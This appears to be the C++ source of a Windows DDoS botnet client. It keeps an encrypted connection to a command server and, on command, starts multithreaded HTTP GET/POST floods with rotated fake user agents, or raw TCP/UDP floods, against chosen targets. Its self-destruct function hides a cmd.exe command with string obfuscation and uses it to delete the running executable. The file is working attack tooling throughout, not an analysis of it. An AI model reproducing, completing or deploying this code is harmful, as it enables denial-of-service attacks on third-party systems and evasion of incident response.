#include "App.h"

#include <shellapi.h>
#include <cpr/cpr.h>

#include "XorStr.hpp"

const vector<string> g_UserAgents = {
  "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN"\
};

bool Application::clientHello(boost::system::error_code& ec) {
    ClientHello ch{};
    ch.version = AURORA_VERSION;
    randombytes_buf(ch.ad.data(), ch.ad.max_size());
    memcpy_s(
        ch.pk.data(), ch.pk.max_size(),
        this->session.pk.data(), this->session.pk.size()
    );
    msgpack::sbuffer packedClientHello;
    msgpack::pack(packedClientHello, ch);
    const optional<string> compressed = encodings::compress(
        reinterpret_cast<const Bytef*>(packedClientHello.data()), 
        packedClientHello.size()
    );
    if (!compressed) {
#ifndef NDEBUG
        cerr << "encodings::compress " << endl;
#endif
        return false;
    }
    this->sendMessage(compressed.value());
    boost::asio::streambuf buffer;
    boost::asio::read_until(*socket, buffer, SOCKET_DELIMITER, ec);
    if (ec) {
#ifndef NDEBUG
        cerr << "Application::clientHello:: boost::asio::read_until " << ec.message() << std::endl;
#endif
        return false;
    }
    const string decoded = base64_decode(
        asio::buffer_cast<const char*>(buffer.data()), buffer.size() - SOCKET_DELIMITER.size()
    );
    const optional<string> uncompressed = encodings::decompress(decoded);
    if (!uncompressed) return false;
    auto sh = msgpack::unpackt<ServerHello>(uncompressed.value());
    memcpy_s(
        this->session.server_pk.data(), this->session.server_pk.max_size(),
        sh.pk.data(), sh.pk.size()
    );
    if (crypto_kx_client_session_keys(
        this->session.rx.data(),
        this->session.tx.data(),
        this->session.pk.data(),
        this->session.sk.data(),
        this->session.server_pk.data()) != SODIUM_SUCCESS) {
        return false;
    }
    crypt::XChaCha20Poly1305 cipher(this->session.rx);
    const auto dec_ad = cipher.decrypt(sh.ad);
    if (!dec_ad) return false;
    return (
        dec_ad.value().size() == ch.ad.size() &&
        memcmp(ch.ad.data(), dec_ad.value().data(), ch.ad.size()) == 0
        );
}

size_t Application::sendMessage(const string& msg) {
    return this->sendMessage(reinterpret_cast<const uint8_t*>(msg.data()), msg.size());
}

size_t Application::sendMessage(const uint8_t* data, const size_t dataSize) {
    boost::system::error_code error;
    std::lock_guard<std::mutex> lg(this->mx);
    const string encodedMsg = base64_encode(data, dataSize) + string(SOCKET_DELIMITER);
    const size_t bytes_write = this->socket->write_some(asio::buffer(encodedMsg), error);
    if (error) {
#ifdef _DEBUG
        cout << "sendMessage " << error.message() << endl;
#endif
    }
    return bytes_write;
}

size_t Application::sendMessage(const byte_array& msg) {
    return this->sendMessage(msg.data(), msg.size());
}

size_t Application::sendMessage(const msgpack::sbuffer& msg) {
    return this->sendMessage(reinterpret_cast<const uint8_t*>(msg.data()), msg.size());
}

bool Application::reconnect() {
    boost::system::error_code error;
    if (this->socket->is_open()) {
        this->socket->close(error);
        error.clear();
    }
retry:
    this->socket.reset();
    this->socket = std::make_shared<tcp::socket>(tcp::socket(this->io_service));
    this->socket->connect(this->endpoint, error);
    if (error) {
        error.clear();
        Sleep(5000);
        goto retry;
    }
    return true;
}

void Application::run() {
    boost::system::error_code ec;
    this->endpoint = tcp::endpoint(
        ip::address::from_string(this->getHost()),
        this->getPort()
    );
    this->socket->connect(this->endpoint, ec);
    if (ec) {
#ifdef _DEBUG
        cout << "this->socket->connect: " << ec.message() << endl;
#endif
        std::exit(EXIT_FAILURE);
    }
  
    crypt::gen_kx_keypair(this->session.pk, this->session.sk);
connect:
    if (!clientHello(ec)) {
#ifndef NDEBUG
        if (ec) cerr << "clientHello" << ec.message() << endl;
#endif
        std::exit(EXIT_FAILURE);
    }
    while (true) {
        ec.clear();
        asio::streambuf receive_buffer;
        asio::read_until(*socket, receive_buffer, SOCKET_DELIMITER, ec);
        if (ec) {
#ifndef  NDEBUG
            std::cout << ec.message() << std::endl;
#endif // ! NDEBUG
        }
        if (
            ec == boost::asio::error::connection_refused ||
            ec == boost::asio::error::connection_reset ||
            ec == boost::asio::error::connection_aborted ||
            ec == boost::asio::error::network_down ||
            ec == boost::asio::error::network_reset ||
            ec == boost::asio::error::eof
            ) {
            if (this->reconnect()) goto connect;
        }

        if (!ec) {
            try {
                byte_array raw;
                auto data = this->recv<msgpack_object>(receive_buffer, &raw);
                if (!data || !data.value().contains("action")) continue;

                Action action = static_cast<Action>(data.value()["action"].as_uint64_t());
                switch (action) {
                case Action::L4_DDOS: 
                case Action::L7_DDOS: {
                        this->ddosStopped = false;
                        crypt::HashGenerator generator(this->session.rx);
                        auto ddosData = msgpack::unpackt<StartDDoS>(raw);
                      
                        if (ddosData.action == Action::L7_DDOS) {
                            for (uint32_t i = 0; i < ddosData.threads_count; i++) {
                                auto thread = std::thread(&Application::DdosThreadL7, this, ddosData.urlOrHost);
                                thread.detach();
                            }
                        }
                        else if (ddosData.action == Action::L4_DDOS && ddosData.port) {
                            for (uint32_t i = 0; i < ddosData.threads_count; i++) {
                                auto thread = std::thread(
                                    &Application::DdosThreadL4, 
                                    this, 
                                    ddosData.urlOrHost, 
                                    ddosData.port.value(),
                                    ddosData.udp
                                );
                                thread.detach();
                            }
                        }
                        break;
                }
                case Action::STOP_DDOS: {
                    this->ddosStopped = true;
                    break;
                }
                case Action::SELF_DESTRUCT: {
                    this->SelfDesctruct();
                    break;
                }
            }
            }
            catch (...) {
                continue;
            }
        }
    }
}

void Application::DdosThreadL7(string url) {
    array<uint8_t, 1024> body{};
    while (!ddosStopped) {
        try {
            bool usePost = randombytes_random() % 2 == 0;
            const string userAgent = random::select_randomly(g_UserAgents);
            if (usePost) {
                randombytes_buf(body.data(), body.size());
                cpr::Post(
                    cpr::Url{ url },
                    cpr::Body{ base64_encode(body.data(), body.size()) },
                    cpr::Redirect{ -1, true, false, cpr::PostRedirectFlags::POST_ALL },
                    cpr::Header{
                       {"Accept", "*/*"},
                       {"Accept-Encoding", "gzip, deflate"},
                       {"Accept-Language", "en-US,en;q=0.5"},
                       {"Connection", "keep-alive"},
                       {"Content-Type", "text/plain"}
                    }
                );
            }
            else {
                cpr::Get(
                    cpr::Url{ url },
                    cpr::Redirect{ -1, true, false, cpr::PostRedirectFlags::POST_ALL },
                    cpr::Header{
                        {"Accept", "*/*"},
                        {"Accept-Encoding", "gzip, deflate"},
                        {"Accept-Language", "en-US,en;q=0.5"},
                        {"Connection", "keep-alive"},
                    }
                );
            }
        }
        catch (...) {}
        Sleep(100);
    }
}

void Application::DdosThreadL4(string host, const uint16_t port, optional<bool> udp) {
    typedef shared_ptr<udp::socket> udp_socket_ptr;
    auto udp_endpoint = udp::endpoint(ip::address::from_string(host), port);
    auto tcp_endpoint = tcp::endpoint(ip::address::from_string(host), port);
    const bool isUdp = udp && udp.value();
    boost::system::error_code ec;
    udp_socket_ptr udp_socket;
    socket_ptr tcp_socket;
    if (isUdp) {
        udp_socket = std::make_shared<udp::socket>(udp::socket(this->io_service));
        udp_socket->connect(udp_endpoint, ec);
    }
    else {
        tcp_socket = std::make_shared<tcp::socket>(tcp::socket(this->io_service));
        tcp_socket->connect(tcp_endpoint, ec);
    }
    array<uint8_t, 1024> buffer{};
    while (!ddosStopped) {
        try {
            ec.clear();
            randombytes_buf(buffer.data(), buffer.size());
            if (isUdp && udp_socket) {
                udp_socket->send(asio::buffer(buffer), 0, ec);
            }
            else if (tcp_socket) {
                tcp_socket->write_some(asio::buffer(buffer), ec);
            }
        }
        catch (...) {}
        Sleep(100);
    }
}

wstring os::getExecutePathW() {
    WCHAR buffer[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    return buffer;
}

[[noreturn]] void Application::SelfDesctruct() {
    const wstring cmd = XorStr_(L"/C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"") + os::getExecutePathW() + L"\"";
    ShellExecuteW(HWND_DESKTOP, XorStr_(L"open"), XorStr_(L"cmd.exe"), cmd.c_str(), NULL, SW_HIDE);
    ExitProcess(EXIT_SUCCESS);
}